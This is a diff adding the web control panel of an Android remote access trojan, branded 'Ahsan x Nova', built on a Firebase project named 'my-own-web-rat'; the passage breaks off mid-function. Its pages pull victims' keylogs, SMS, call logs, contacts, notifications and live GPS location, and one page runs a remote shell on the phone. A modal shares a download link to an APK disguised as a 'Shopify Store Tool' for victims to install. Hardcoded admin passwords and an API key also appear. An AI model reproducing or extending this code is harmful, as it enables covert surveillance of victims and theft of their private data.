@@ -1,0 +1,674 @@
+<!DOCTYPE html>
+<html lang="en" data-theme="dark">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no">
+<meta name="theme-color" content="#08080f">
+<title>Ahsan x Nova - Monitor</title>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+<link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"/>
+<script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
+<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+
+<style>
+/* ================= NOVA PREMIUM CSS ================= */
+*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+:root{
+  --bg:#08080f;--bg2:#0f0f1a;--card:#14141f;--card2:#1c1c2b;--br:#2a2a3d;
+  --tx:#fff;--tx2:#a0a0b8;--tx3:#606080;
+  --pu:#a855f7;--cy:#06b6d4;--pk:#ec4899;--gr:#10b981;--rd:#ef4444;--or:#f59e0b;
+  --gr1:linear-gradient(135deg,#a855f7,#06b6d4);
+  --gr3:linear-gradient(135deg,#10b981,#06b6d4);
+  --gr4:linear-gradient(135deg,#ef4444,#f59e0b);
+}
+html{scroll-behavior:smooth}
+body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;font-size:14px;color:var(--tx);background:var(--bg);min-height:100vh;overflow-x:hidden;padding-bottom:80px}
+body::before{content:'';position:fixed;inset:0;z-index:-1;pointer-events:none;background:radial-gradient(circle at 0% 0%,rgba(168,85,247,.12),transparent 50%),radial-gradient(circle at 100% 100%,rgba(6,182,212,.1),transparent 50%)}
+::-webkit-scrollbar{width:4px;height:4px}::-webkit-scrollbar-thumb{background:var(--br);border-radius:99px}
+
+/* LOGIN */
+#loginScreen{position:fixed;inset:0;z-index:9999;display:flex;align-items:center;justify-content:center;padding:1.5rem;background:var(--bg)}
+.login-card{width:100%;max-width:380px;padding:2.5rem 1.5rem;background:var(--card);border:1px solid var(--br);border-radius:28px;text-align:center;box-shadow:0 20px 40px rgba(0,0,0,.5)}
+.login-logo{width:80px;height:80px;margin:0 auto 1rem;border-radius:20px;object-fit:cover;border:2px solid var(--pu);box-shadow:0 0 20px rgba(168,85,247,.4)}
+.login-card h1{font-size:1.5rem;font-weight:900;background:var(--gr1);-webkit-background-clip:text;-webkit-text-fill-color:transparent;margin-bottom:.2rem}
+.login-card p{font-size:.75rem;color:var(--tx3);text-transform:uppercase;letter-spacing:.1em;font-weight:700;margin-bottom:1.5rem}
+.lg-in{position:relative;margin-bottom:.75rem}
+.lg-in input{width:100%;padding:.85rem 1rem .85rem 2.5rem;font-size:.85rem;color:var(--tx);background:var(--bg2);border:1px solid var(--br);border-radius:12px;outline:none}
+.lg-in input:focus{border-color:var(--pu)}
+.lg-in i{position:absolute;left:1rem;top:50%;transform:translateY(-50%);color:var(--tx3)}
+.lg-btn{width:100%;padding:.85rem;margin-top:.5rem;font-size:.85rem;font-weight:800;color:#fff;background:var(--gr1);border:none;border-radius:12px;cursor:pointer}
+.lg-hint{margin-top:1.25rem;padding:.65rem;font-size:.65rem;color:var(--tx3);background:var(--bg2);border-radius:10px;border:1px dashed var(--br);word-break:break-all}
+
+/* HEADER */
+.top{position:sticky;top:0;z-index:100;display:flex;align-items:center;justify-content:space-between;padding:.75rem 1rem;background:rgba(20,20,31,.95);backdrop-filter:blur(10px);border-bottom:1px solid var(--br)}
+.brand{display:flex;align-items:center;gap:.5rem;cursor:pointer}
+.brand img{width:38px;height:38px;border-radius:10px;object-fit:cover;border:1.5px solid var(--pu)}
+.brand h1{font-size:.9rem;font-weight:900;color:var(--tx)}
+.brand span{font-size:.5rem;color:var(--tx3);letter-spacing:.1em;display:block}
+.h-actions{display:flex;gap:.3rem;align-items:center}
+.h-btn{width:32px;height:32px;display:flex;align-items:center;justify-content:center;background:var(--bg2);border:1px solid var(--br);border-radius:9px;color:var(--tx2);cursor:pointer}
+.h-btn.crown{color:var(--or)}.h-btn.key{color:var(--gr)}.h-btn.apk{color:var(--pk)}.h-btn.out{color:var(--rd)}
+.pill{display:flex;align-items:center;gap:.25rem;padding:.3rem .5rem;font-size:.55rem;font-weight:800;border-radius:99px;background:var(--bg2);border:1px solid var(--br);text-transform:uppercase}
+.pill::before{content:'';width:6px;height:6px;border-radius:50%;background:currentColor}
+.pill.on{color:var(--gr)}.pill.off{color:var(--rd)}
+
+/* CONTENT & PAGES */
+.content{padding:1rem;max-width:1000px;margin:0 auto;display:none}
+.ptitle{display:flex;align-items:center;gap:.75rem;margin-bottom:1rem}
+.ptitle-ic{width:42px;height:42px;display:flex;align-items:center;justify-content:center;background:var(--gr1);border-radius:12px;color:#fff;font-size:1rem}
+.ptitle h1{font-size:1.15rem;font-weight:900}
+.ptitle p{font-size:.6rem;color:var(--tx3);text-transform:uppercase;letter-spacing:.05em}
+.back-btn{display:inline-flex;align-items:center;gap:.3rem;background:transparent;border:none;color:var(--pu);font-weight:700;font-size:.75rem;margin-bottom:1rem;cursor:pointer}
+.page{display:none}.page.active{display:block;animation:fadeIn .3s}
+@keyframes fadeIn{from{opacity:0}to{opacity:1}}
+
+/* CARDS & STATS */
+.stats{display:grid;grid-template-columns:repeat(2,1fr);gap:.5rem;margin-bottom:1rem}
+@media(min-width:600px){.stats{grid-template-columns:repeat(4,1fr)}.info-grid{grid-template-columns:repeat(2,1fr)}}
+.stat{padding:.85rem;background:var(--card);border:1px solid var(--br);border-radius:14px}
+.s-ic{width:28px;height:28px;display:flex;align-items:center;justify-content:center;border-radius:8px;font-size:.8rem;margin-bottom:.5rem}
+.stat.pu .s-ic{background:rgba(168,85,247,.15);color:var(--pu)}
+.stat.gr .s-ic{background:rgba(16,185,129,.15);color:var(--gr)}
+.stat.rd .s-ic{background:rgba(239,68,68,.15);color:var(--rd)}
+.stat.cy .s-ic{background:rgba(6,182,212,.15);color:var(--cy)}
+.s-val{font-size:1.4rem;font-weight:900;margin-bottom:.1rem}
+.s-lbl{font-size:.55rem;font-weight:800;text-transform:uppercase;color:var(--tx3)}
+
+.sh{display:flex;align-items:center;justify-content:space-between;margin-bottom:.75rem}
+.sh h2{font-size:.85rem;font-weight:900;display:flex;align-items:center;gap:.4rem}
+.rf{display:flex;align-items:center;gap:.25rem;padding:.4rem .6rem;font-size:.65rem;font-weight:800;color:var(--tx2);background:var(--card);border:1px solid var(--br);border-radius:8px;cursor:pointer}
+
+/* DEVICE CARDS */
+.dev-list{display:flex;flex-direction:column;gap:.75rem}
+.dev{padding:1rem;background:var(--card);border:1px solid var(--br);border-radius:16px}
+.dev-top{display:flex;align-items:center;justify-content:space-between;margin-bottom:.75rem}
+.dev-info{display:flex;align-items:center;gap:.5rem;min-width:0}
+.dev-ic{width:38px;height:38px;display:flex;align-items:center;justify-content:center;background:var(--gr1);color:#fff;border-radius:10px;font-size:1rem}
+.dev-info h3{font-size:.85rem;font-weight:800;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.dev-info p{font-size:.6rem;color:var(--tx3)}
+.dev-meta{display:grid;grid-template-columns:repeat(3,1fr);gap:.5rem;padding-top:.75rem;border-top:1px dashed var(--br);margin-bottom:.75rem}
+.dev-meta span:first-child{display:block;font-size:.5rem;font-weight:800;color:var(--tx3);text-transform:uppercase}
+.dev-meta span:last-child{font-size:.7rem;font-weight:700}
+.dev-btn{display:flex;align-items:center;justify-content:center;gap:.4rem;padding:.6rem;font-size:.75rem;font-weight:800;color:#fff;background:var(--gr1);border:none;border-radius:10px;cursor:pointer}
+.bdg{display:inline-flex;align-items:center;gap:.25rem;padding:.25rem .5rem;font-size:.55rem;font-weight:900;border-radius:99px}
+.bdg.on{color:var(--gr);background:rgba(16,185,129,.15)}.bdg.off{color:var(--rd);background:rgba(239,68,68,.15)}
+
+/* INFO CARDS */
+.info-grid{display:grid;grid-template-columns:1fr;gap:.75rem}
+.icard{padding:.85rem;background:var(--card);border:1px solid var(--br);border-radius:14px}
+.icard h3{font-size:.75rem;font-weight:900;margin-bottom:.5rem;padding-bottom:.4rem;border-bottom:1px solid var(--br);display:flex;align-items:center;gap:.3rem}
+.icard h3 i{color:var(--pu)}
+.irow{display:flex;justify-content:space-between;padding:.3rem 0;font-size:.7rem}
+.irow:not(:last-child){border-bottom:1px dashed var(--br)}
+.ilbl{color:var(--tx3);font-weight:600}.ival{color:var(--tx);font-weight:700;font-family:monospace}
+
+/* TABLES */
+.tcard{background:var(--card);border:1px solid var(--br);border-radius:14px;overflow:hidden}
+.tscroll{overflow-x:auto}
+table{width:100%;border-collapse:collapse;font-size:.7rem}
+th{padding:.6rem;font-size:.55rem;font-weight:900;text-transform:uppercase;color:var(--tx3);text-align:left;background:var(--bg2);white-space:nowrap}
+td{padding:.6rem;border-top:1px solid var(--br);color:var(--tx2)}
+td b{color:var(--tx)}
+tr.sms-row{cursor:pointer;transition:background .2s}
+tr.sms-row:active{background:var(--bg2)}
+
+/* FORMS & BUTTONS */
+.fg{margin-bottom:.75rem}
+.fg input,.fg textarea{width:100%;padding:.65rem;font-size:.8rem;color:var(--tx);background:var(--bg2);border:1px solid var(--br);border-radius:9px;outline:none}
+.btn{display:flex;align-items:center;justify-content:center;gap:.3rem;padding:.6rem 1rem;font-size:.75rem;font-weight:800;border:none;border-radius:9px;cursor:pointer}
+.btn.pri{background:var(--gr1);color:#fff}.btn.suc{background:var(--gr3);color:#fff}.btn.dgr{background:var(--gr4);color:#fff}.btn.out{background:var(--bg2);color:var(--tx2);border:1px solid var(--br)}
+.btn.full{width:100%}
+.ag{display:grid;grid-template-columns:repeat(2,1fr);gap:.5rem}.ag .full{grid-column:span 2}
+.term{background:#000;color:#0f0;font-family:monospace;font-size:.7rem;padding:.6rem;border-radius:9px;height:130px;overflow-y:auto;margin-bottom:.5rem}
+
+/* NAV BAR */
+.nav{position:fixed;bottom:0;left:0;right:0;z-index:200;background:rgba(20,20,31,.95);backdrop-filter:blur(10px);border-top:1px solid var(--br);padding:.4rem;display:flex;overflow-x:auto;scrollbar-width:none}
+.nav::-webkit-scrollbar{display:none}
+.nlink{flex-shrink:0;display:flex;flex-direction:column;align-items:center;gap:.15rem;padding:.3rem .5rem;min-width:55px;font-size:.5rem;font-weight:800;color:var(--tx3);border-radius:8px;cursor:pointer;text-transform:uppercase}
+.nlink.on{color:#fff;background:var(--gr1)}
+.nlink i{font-size:1rem}
+
+/* MODALS */
+.mdl{display:none;position:fixed;inset:0;z-index:1000;padding:1rem;background:rgba(0,0,0,.8);backdrop-filter:blur(5px);overflow-y:auto}
+.mdl.on{display:flex;align-items:flex-start;justify-content:center;padding-top:2rem}
+.mbox{width:100%;max-width:400px;background:var(--card);border-radius:20px;overflow:hidden;border:1px solid var(--br)}
+.mhead{display:flex;align-items:center;justify-content:space-between;padding:.85rem 1rem;background:var(--gr1);color:#fff}
+.mhead h2{font-size:.85rem;font-weight:900;display:flex;align-items:center;gap:.4rem}
+.mclose{background:rgba(255,255,255,.2);border:none;color:#fff;width:28px;height:28px;border-radius:8px;cursor:pointer}
+.mbody{padding:1rem}
+
+/* SPECIAL SMS VIEW */
+.sms-bubble{background:var(--bg2);border-radius:12px;padding:1rem;margin-bottom:1rem;border-left:3px solid var(--cy)}
+.sms-bubble .header{display:flex;justify-content:space-between;font-size:.65rem;color:var(--tx3);margin-bottom:.5rem;padding-bottom:.5rem;border-bottom:1px dashed var(--br)}
+.sms-bubble .body{font-size:.85rem;color:var(--tx);line-height:1.5;word-wrap:break-word;user-select:text}
+
+#map{height:calc(100vh - 250px);min-height:250px;border-radius:14px;border:1px solid var(--br)}
+.empty{padding:2rem;text-align:center;color:var(--tx3)}
+.empty i{font-size:2rem;margin-bottom:.5rem;opacity:.5}
+</style>
+</head>
+<body>
+
+<!-- ================= LOGIN ================= -->
+<div id="loginScreen">
+  <div class="login-card">
+    <img src="https://i.ibb.co/JFCSTtcZ/601653.jpg" class="login-logo">
+    <h1>AHSAN X NOVA</h1>
+    <p>Monitor System</p>
+    <div class="lg-in"><i class="fas fa-envelope"></i><input type="email" id="loginUser" placeholder="Email address"></div>
+    <div class="lg-in"><i class="fas fa-lock"></i><input type="password" id="loginPass" placeholder="Password"></div>
+    <button class="lg-btn" onclick="doLogin()"><i class="fas fa-arrow-right-to-bracket"></i> Sign In</button>
+    <div class="lg-hint" id="loginHint">Loading...</div>
+  </div>
+</div>
+
+<!-- ================= DASHBOARD ================= -->
+<div id="appMain" style="display:none;">
+  
+  <header class="top">
+    <div class="brand" onclick="goPage('devices')">
+      <img src="https://i.ibb.co/JFCSTtcZ/601653.jpg">
+      <div><h1>Ahsan x Nova</h1><span>MONITOR</span></div>
+    </div>
+    <div class="h-actions">
+      <button class="h-btn crown" onclick="openM('adminModal')"><i class="fas fa-crown"></i></button>
+      <button class="h-btn key" onclick="openM('passModal')"><i class="fas fa-key"></i></button>
+      <button class="h-btn apk" onclick="openM('apkModal')"><i class="fas fa-download"></i></button>
+      <button class="h-btn out" onclick="logout()"><i class="fas fa-power-off"></i></button>
+      <div id="conn" class="pill off">...</div>
+    </div>
+  </header>
+
+  <main class="content" id="mainContent">
+
+    <!-- PAGE 1: DEVICES -->
+    <div id="p-devices" class="page active">
+      <div class="ptitle">
+        <div class="ptitle-ic"><i class="fas fa-satellite-dish"></i></div>
+        <div><h1>Command Center</h1><p>Real-time Monitoring</p></div>
+      </div>
+      <div class="stats">
+        <div class="stat pu"><div class="s-ic"><i class="fas fa-layer-group"></i></div><div class="s-val" id="s-total">0</div><div class="s-lbl">Total</div></div>
+        <div class="stat gr"><div class="s-ic"><i class="fas fa-wifi"></i></div><div class="s-val" id="s-online">0</div><div class="s-lbl">Online</div></div>
+        <div class="stat rd"><div class="s-ic"><i class="fas fa-plug-circle-xmark"></i></div><div class="s-val" id="s-offline">0</div><div class="s-lbl">Offline</div></div>
+        <div class="stat cy"><div class="s-ic"><i class="fas fa-tower-cell"></i></div><div class="s-val" id="s-server">--</div><div class="s-lbl">Server</div></div>
+      </div>
+      <div class="sh"><h2><i class="fas fa-server"></i> Connected Devices</h2><button class="rf" onclick="renderDevices()"><i class="fas fa-sync-alt"></i> Refresh</button></div>
+      <div class="dev-list" id="deviceList"><div class="empty"><i class="fas fa-spinner fa-spin"></i><p>Loading...</p></div></div>
+    </div>
+
+    <!-- PAGE 2: DEVICE DETAIL -->
+    <div id="p-detail" class="page">
+      <button class="back-btn" onclick="goPage('devices')"><i class="fas fa-arrow-left"></i> Back to Devices</button>
+      <div class="ptitle"><div class="ptitle-ic"><i class="fas fa-mobile-screen"></i></div><div><h1 id="d-name">Device</h1><p id="d-id">ID: ...</p></div></div>
+      <div style="display:flex;gap:.5rem;margin-bottom:1rem;align-items:center;">
+        <button id="d-del" class="btn dgr" onclick="delDevice()" style="display:none;"><i class="fas fa-trash"></i> Delete</button>
+        <span id="d-status" class="bdg off">-</span>
+      </div>
+      <div class="info-grid">
+        <div class="icard"><h3><i class="fas fa-battery-half"></i> Battery</h3><div class="irow"><span class="ilbl">Level</span><span class="ival" id="d-bat">-</span></div></div>
+        <div class="icard"><h3><i class="fas fa-network-wired"></i> Network</h3><div class="irow"><span class="ilbl">IP</span><span class="ival" id="d-ip">-</span></div></div>
+        <div class="icard"><h3><i class="fas fa-microchip"></i> Hardware</h3><div class="irow"><span class="ilbl">Board</span><span class="ival" id="d-hw">-</span></div></div>
+        <div class="icard"><h3><i class="fas fa-clock"></i> Last Seen</h3><div class="irow"><span class="ilbl">Time</span><span class="ival" id="d-seen">-</span></div></div>
+      </div>
+    </div>
+
+    <!-- PAGE 3: REMOTE -->
+    <div id="p-remote" class="page">
+      <div class="ptitle"><div class="ptitle-ic"><i class="fas fa-satellite-dish"></i></div><div><h1>Remote Control</h1><p>Device Actions</p></div></div>
+      <div class="icard" style="margin-bottom:.75rem;"><h3><i class="fas fa-bolt"></i> Hardware</h3><div class="ag">
+        <button class="btn pri" onclick="sendCmd('vibrate',{duration:3000})"><i class="fas fa-vibration"></i> Vibrate</button>
+        <button class="btn suc" onclick="sendCmd('torch',{status:true})"><i class="fas fa-lightbulb"></i> Torch ON</button>
+        <button class="btn dgr" onclick="sendCmd('torch',{status:false})"><i class="fas fa-power-off"></i> Torch OFF</button>
+        <button class="btn out" onclick="sendCmd('lock')"><i class="fas fa-lock"></i> Lock</button>
+      </div></div>
+      <div class="icard" style="margin-bottom:.75rem;"><h3><i class="fas fa-comment-dots"></i> Popups</h3>
+        <div class="fg"><input type="text" id="popup-txt" placeholder="Type message..."></div>
+        <div style="display:flex;gap:.5rem;margin-bottom:.75rem;">
+          <button class="btn pri" style="flex:1;" onclick="sendCmd('show_toast',{message:document.getElementById('popup-txt').value})"><i class="fas fa-comment"></i> Toast</button>
+          <button class="btn suc" style="flex:1;" onclick="sendCmd('show_notification',{title:'Alert',message:document.getElementById('popup-txt').value})"><i class="fas fa-bell"></i> Notif</button>
+        </div>
+        <div class="fg"><input type="text" id="speak-txt" placeholder="Text to speak..."></div>
+        <button class="btn pri full" onclick="sendCmd('speak',{text:document.getElementById('speak-txt').value})"><i class="fas fa-volume-up"></i> Speak</button>
+      </div>
+      <div class="icard" style="margin-bottom:.75rem;"><h3><i class="fas fa-terminal"></i> Remote Shell</h3>
+        <div class="term" id="term-box">Welcome...</div>
+        <div style="display:flex;gap:.5rem;"><input type="text" id="shell-in" class="fg" style="margin:0;flex:1;" placeholder="Command..."><button class="btn pri" onclick="runShell()"><i class="fas fa-play"></i></button></div>
+      </div>
+    </div>
+
+    <!-- PAGE 4: LOCATION -->
+    <div id="p-location" class="page">
+      <div class="ptitle"><div class="ptitle-ic"><i class="fas fa-map-location-dot"></i></div><div><h1>Live Location</h1><p>GPS Tracking</p></div></div>
+      <div id="map" style="margin-bottom:.75rem;"></div>
+      <div style="display:flex;gap:.5rem;"><button class="btn suc" style="flex:1;" onclick="sendCmd('start_location_tracking')"><i class="fas fa-play"></i> Start</button><button class="btn dgr" style="flex:1;" onclick="sendCmd('stop_location_tracking')"><i class="fas fa-stop"></i> Stop</button></div>
+    </div>
+
+    <!-- PAGE 5: KEYLOGS -->
+    <div id="p-keylogs" class="page">
+      <div class="ptitle"><div class="ptitle-ic"><i class="fas fa-keyboard"></i></div><div><h1>Keylogs</h1><p>Captured Text</p></div></div>
+      <div class="fg"><input type="text" id="log-search" placeholder="Search logs..." oninput="filterLogs(this.value)"></div>
+      <div class="tcard"><div class="tscroll"><table><thead><tr><th>Time</th><th>App</th><th>Text</th></tr></thead><tbody id="keylogs-body"></tbody></table></div></div>
+    </div>
+
+    <!-- PAGE 6: INFO -->
+    <div id="p-info" class="page">
+      <div class="ptitle"><div class="ptitle-ic"><i class="fas fa-circle-info"></i></div><div><h1>System Info</h1><p>Device Details</p></div></div>
+      <div class="sh"><h2>Hardware</h2><button class="rf" onclick="sendCmd('get_system_info')"><i class="fas fa-sync-alt"></i> Fetch</button></div>
+      <div class="info-grid" id="sys-info"></div>
+    </div>
+
+    <!-- PAGE 7: APPS -->
+    <div id="p-apps" class="page">
+      <div class="ptitle"><div class="ptitle-ic"><i class="fas fa-cubes"></i></div><div><h1>Installed Apps</h1><p>Applications</p></div></div>
+      <div class="sh"><h2>All Apps</h2><button class="rf" onclick="sendCmd('get_installed_apps')"><i class="fas fa-sync-alt"></i> Fetch</button></div>
+      <div class="tcard"><div class="tscroll"><table><thead><tr><th>App</th><th>Package</th></tr></thead><tbody id="apps-body"></tbody></table></div></div>
+    </div>
+
+    <!-- PAGE 8: CALLS -->
+    <div id="p-calls" class="page">
+      <div class="ptitle"><div class="ptitle-ic"><i class="fas fa-phone"></i></div><div><h1>Call Logs</h1><p>Recent Calls</p></div></div>
+      <div class="sh"><h2>All Calls</h2><button class="rf" onclick="sendCmd('get_call_log')"><i class="fas fa-sync-alt"></i> Fetch</button></div>
+      <div class="tcard"><div class="tscroll"><table><thead><tr><th>Type</th><th>Number</th><th>Date</th></tr></thead><tbody id="calls-body"></tbody></table></div></div>
+    </div>
+
+    <!-- PAGE 9: SMS (Clickable Rows) -->
+    <div id="p-sms" class="page">
+      <div class="ptitle"><div class="ptitle-ic"><i class="fas fa-comment-dots"></i></div><div><h1>SMS Logs</h1><p>Messages (Tap to Read)</p></div></div>
+      <div class="sh"><h2>All SMS</h2><button class="rf" onclick="sendCmd('get_sms_log')"><i class="fas fa-sync-alt"></i> Fetch</button></div>
+      <div class="tcard"><div class="tscroll"><table><thead><tr><th>Address</th><th>Body (Tap)</th></tr></thead><tbody id="sms-body"></tbody></table></div></div>
+    </div>
+
+    <!-- PAGE 10: CONTACTS -->
+    <div id="p-contacts" class="page">
+      <div class="ptitle"><div class="ptitle-ic"><i class="fas fa-address-book"></i></div><div><h1>Contacts</h1><p>Phone Book</p></div></div>
+      <div class="sh"><h2>All Contacts</h2><button class="rf" onclick="sendCmd('get_contacts')"><i class="fas fa-sync-alt"></i> Fetch</button></div>
+      <div class="tcard"><div class="tscroll"><table><thead><tr><th>Name</th><th>Phone</th></tr></thead><tbody id="contacts-body"></tbody></table></div></div>
+    </div>
+
+    <!-- PAGE 11: NOTIFICATIONS -->
+    <div id="p-notifications" class="page">
+      <div class="ptitle"><div class="ptitle-ic"><i class="fas fa-bell"></i></div><div><h1>Notifications</h1><p>App Alerts</p></div></div>
+      <div class="tcard"><div class="tscroll"><table><thead><tr><th>Time</th><th>App</th><th>Message</th></tr></thead><tbody id="notif-body"></tbody></table></div></div>
+    </div>
+
+  </main>
+
+  <!-- BOTTOM NAV -->
+  <nav class="nav" id="bottomNav" style="display:none;">
+    <div class="nlink on" id="n-devices" onclick="goPage('devices')"><i class="fas fa-layer-group"></i><span>Devices</span></div>
+    <div class="nlink" id="n-detail" onclick="goPage('detail')"><i class="fas fa-gauge"></i><span>Dashboard</span></div>
+    <div class="nlink" id="n-remote" onclick="goPage('remote')"><i class="fas fa-satellite-dish"></i><span>Remote</span></div>
+    <div class="nlink" id="n-location" onclick="goPage('location')"><i class="fas fa-map-location-dot"></i><span>Location</span></div>
+    <div class="nlink" id="n-keylogs" onclick="goPage('keylogs')"><i class="fas fa-keyboard"></i><span>Keylogs</span></div>
+    <div class="nlink" id="n-info" onclick="goPage('info')"><i class="fas fa-circle-info"></i><span>Info</span></div>
+    <div class="nlink" id="n-apps" onclick="goPage('apps')"><i class="fas fa-cubes"></i><span>Apps</span></div>
+    <div class="nlink" id="n-calls" onclick="goPage('calls')"><i class="fas fa-phone"></i><span>Calls</span></div>
+    <div class="nlink" id="n-sms" onclick="goPage('sms')"><i class="fas fa-comment-dots"></i><span>SMS</span></div>
+    <div class="nlink" id="n-contacts" onclick="goPage('contacts')"><i class="fas fa-address-book"></i><span>Contacts</span></div>
+    <div class="nlink" id="n-notifications" onclick="goPage('notifications')"><i class="fas fa-bell"></i><span>Notif</span></div>
+  </nav>
+
+</div> <!-- END APP MAIN -->
+
+<!-- ================= MODALS ================= -->
+
+<!-- SMS FULL VIEW MODAL -->
+<div id="smsViewModal" class="mdl">
+  <div class="mbox">
+    <div class="mhead" style="background:var(--gr3);">
+      <h2><i class="fas fa-comment-dots"></i> SMS Details</h2>
+      <button class="mclose" onclick="closeM('smsViewModal')"><i class="fas fa-xmark"></i></button>
+    </div>
+    <div class="mbody">
+      <div class="sms-bubble">
+        <div class="header">
+          <span><i class="fas fa-user"></i> <span id="sms-v-address"></span></span>
+          <span><i class="fas fa-clock"></i> <span id="sms-v-date"></span></span>
+        </div>
+        <div class="body" id="sms-v-body"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ADMIN MODAL -->
+<div id="adminModal" class="mdl">
+  <div class="mbox">
+    <div class="mhead"><h2><i class="fas fa-crown"></i> Admin Panel</h2><button class="mclose" onclick="closeM('adminModal')"><i class="fas fa-xmark"></i></button></div>
+    <div id="ad-view-login"><div class="mbody">
+      <div class="fg"><input type="email" id="ad-email" placeholder="Admin email"></div>
+      <div class="fg"><input type="password" id="ad-pass" placeholder="Password"></div>
+      <button class="btn pri full" onclick="adminLogin()">Authenticate</button>
+    </div></div>
+    <div id="ad-view-dash" style="display:none;">
+      <div class="mbody">
+        <div class="stats" style="grid-template-columns:repeat(3,1fr);margin-bottom:1rem;">
+          <div class="stat pu"><div class="s-val" id="ad-users">0</div><div class="s-lbl">Users</div></div>
+          <div class="stat gr"><div class="s-val" id="ad-online">0</div><div class="s-lbl">Online</div></div>
+          <div class="stat rd"><div class="s-val" id="ad-blocked">0</div><div class="s-lbl">Blocked</div></div>
+        </div>
+        <div class="tcard"><div class="tscroll"><table><thead><tr><th>Email</th><th>Action</th></tr></thead><tbody id="ad-list"></tbody></table></div></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- PASSWORD MODAL -->
+<div id="passModal" class="mdl">
+  <div class="mbox">
+    <div class="mhead"><h2><i class="fas fa-key"></i> Change Login</h2><button class="mclose" onclick="closeM('passModal')"><i class="fas fa-xmark"></i></button></div>
+    <div id="pass-view-auth"><div class="mbody">
+      <div class="fg"><input type="email" id="pass-email" placeholder="Admin email"></div>
+      <div class="fg"><input type="password" id="pass-pass" placeholder="Password"></div>
+      <button class="btn pri full" onclick="verifyPassAdmin()">Verify</button>
+    </div></div>
+    <div id="pass-view-form" style="display:none;"><div class="mbody">
+      <div class="fg"><input type="email" id="new-email" placeholder="New Email"></div>
+      <div class="fg"><input type="password" id="new-pass" placeholder="New Password"></div>
+      <button class="btn suc full" onclick="saveNewLogin()">Save</button>
+    </div></div>
+  </div>
+</div>
+
+<!-- APK MODAL -->
+<div id="apkModal" class="mdl">
+  <div class="mbox">
+    <div class="mhead"><h2><i class="fas fa-download"></i> APK Link</h2><button class="mclose" onclick="closeM('apkModal')"><i class="fas fa-xmark"></i></button></div>
+    <div class="mbody">
+      <p style="font-size:.75rem;margin-bottom:.75rem;">Share this link:</p>
+      <div style="display:flex;gap:.5rem;">
+        <input type="text" id="apkLink" value="https://www.mediafire.com/file/l3fio34b8acjhsy/Shopify_Store_Tool.apk/file" readonly style="flex:1;padding:.5rem;border:1px solid var(--br);border-radius:8px;background:var(--bg2);color:var(--tx);font-size:.65rem;">
+        <button class="btn pri" onclick="copyApk()">Copy</button>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ================= JAVASCRIPT ================= -->
+<script>
+const firebaseConfig = {
+  apiKey: "AIzaSyDPz-lohZeb2fu-hDfrsvkEbpozU6Wkc6k",
+  authDomain: "my-own-web-rat.firebaseapp.com",
+  databaseURL: "https://my-own-web-rat-default-rtdb.firebaseio.com",
+  projectId: "my-own-web-rat",
+  storageBucket: "my-own-web-rat.firebasestorage.app",
+  messagingSenderId: "68154545979",
+  appId: "1:68154545979:web:8d2ffef456a2bbaf16891e"
+};
+if (!firebase.apps.length) firebase.initializeApp(firebaseConfig);
+const db = firebase.database();
+
+const ADMIN_EMAIL = "theanonymous@gmail.com";
+const ADMIN_PASS = "theanonymousontop";
+let devices = {}, currentDevice = null, isAdmin = false, map = null, marker = null, logCache = [];
+
+window.onload = () => { checkSession(); loadHint(); };
+
+async function loadHint() {
+    const s = await db.ref('webLogin').once('value');
+    const d = s.val() || { email: "AhsanxPanther1@gmail.com", password: "AhsanxPantherOnTop", showHint: true };
+    document.getElementById('loginHint').textContent = d.showHint ? `${d.email} / ${d.password}` : "Hint disabled";
+}
+
+async function doLogin() {
+    const email = document.getElementById('loginUser').value.trim();
+    const pass = document.getElementById('loginPass').value.trim();
+    if (!email || !pass) return alert('Fill both fields');
+
+    const blockSnap = await db.ref('blockedEmails/' + email.replace(/\./g, '_')).once('value');
+    if (blockSnap.exists()) return alert('⛔ Access Denied. Email blocked.');
+
+    if (email === ADMIN_EMAIL && pass === ADMIN_PASS) return openM('adminModal');
+
+    const web = await db.ref('webLogin').once('value');
+    const valid = web.val() || { email: "AhsanxPanther1@gmail.com", password: "AhsanxPantherOnTop" };
+    if (email !== valid.email || pass !== valid.password) return alert('❌ Invalid Credentials');
+
+    localStorage.setItem('nova_user', JSON.stringify({ email, time: Date.now() }));
+    await db.ref('users/' + email.replace(/\./g, '_')).set({ email, lastActive: Date.now(), status: 'online' });
+    startApp();
+}
+
+async function checkSession() {
+    const saved = localStorage.getItem('nova_user');
+    if (!saved) return;
+    const u = JSON.parse(saved);
+    const b = await db.ref('blockedEmails/' + u.email.replace(/\./g, '_')).once('value');
+    if (b.exists()) { localStorage.removeItem('nova_user'); return; }
+    startApp();
+}
+
+function startApp() {
+    document.getElementById('loginScreen').style.display = 'none';
+    document.getElementById('appMain').style.display = 'block';
+    document.getElementById('mainContent').style.display = 'block';
+    initDataListeners();
+}
+
+function logout() { localStorage.clear(); location.reload(); }
+
+function openM(id) { document.getElementById(id).classList.add('on'); }
+function closeM(id) { document.getElementById(id).classList.remove('on'); }
+
+async function adminLogin() {
+    if (document.getElementById('ad-email').value === ADMIN_EMAIL && document.getElementById('ad-pass').value === ADMIN_PASS) {
+        isAdmin = true; localStorage.setItem('nova_admin', 'true');
+        document.getElementById('ad-view-login').style.display = 'none';
+        document.getElementById('ad-view-dash').style.display = 'block';
+        loadAdminData();
+    } else alert('❌ Invalid Admin');
+}
+
+async function loadAdminData() {
+    const snap = await db.ref('users').once('value');
+    const users = snap.val() || {};
+    let html = '', total = 0, online = 0;
+    for (const key in users) {
+        const u = users[key];
+        if (u.email === ADMIN_EMAIL) continue;
+        total++; if (u.status === 'online') online++;
+        const isB = await db.ref('blockedEmails/' + u.email.replace(/\./g, '_')).once('value');
